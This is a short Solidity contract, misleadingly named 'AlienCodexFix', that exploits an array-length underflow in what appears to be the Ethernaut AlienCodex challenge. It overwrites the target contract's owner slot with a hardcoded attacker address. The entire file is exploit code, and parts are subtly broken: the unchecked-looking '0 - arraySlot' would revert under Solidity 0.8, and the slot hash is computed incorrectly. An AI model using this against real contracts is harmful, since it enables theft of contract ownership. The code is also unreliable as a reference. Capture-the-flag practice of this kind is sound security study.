pragma solidity ^0.8.0;
interface IAlienCodex {
    function makeContact() external;
    function retract() external;
    function revise(uint256 i, bytes32 _content) external;
}

contract AlienCodexFix {
    IAlienCodex public alienCodex;
    address public attacker = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;

    constructor(address _alienCodex) {
        alienCodex = IAlienCodex(_alienCodex);
    }

    function attack()
        external
    
    {
        alienCodex.makeContact();
        alienCodex.retract();

        // Calculate the storage slot to overwrite owning contract's owner
        uint256 arraySlot = uint256(keccak256(abi.encodePacked(2)));
        
        // Calculate i where codex[i] maps to slot 0 in AlienCodex storage
        uint256 i = 0 - arraySlot;  // This is a uint256 underflow (0 - large_number)
         alienCodex.revise(i, bytes32(uint256(uint160(attacker))));
     }
 }